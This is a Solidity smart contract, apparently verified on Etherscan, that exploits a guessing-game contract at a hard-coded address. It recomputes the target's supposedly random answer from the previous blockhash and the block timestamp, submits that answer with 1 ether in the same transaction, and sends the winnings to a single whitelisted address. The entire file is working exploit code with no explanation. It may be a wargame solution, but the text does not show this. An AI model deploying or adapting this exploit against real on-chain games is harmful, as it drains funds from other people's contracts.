/**
 *Submitted for verification at Etherscan.io on 2021-10-25
*/

pragma solidity 0.8.9;

contract Guesser {
    event Result(bool success);
    
    function guess() public payable {
        require(msg.value == 1 ether);
        require(msg.sender == 0x4301BEd7A2327D175E4842563E044b73a089D199);
        
        uint8 answer = uint8(uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1), 
                        block.timestamp
                    )
                )
            ));
        
        (bool success, ) = 0x74718E577c1aF9DCFABdD06c7601901FbFBDb6F5.call{value: 1 ether}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        
        emit Result(success);
        
        payable(msg.sender).transfer(address(this).balance);
        
    }
}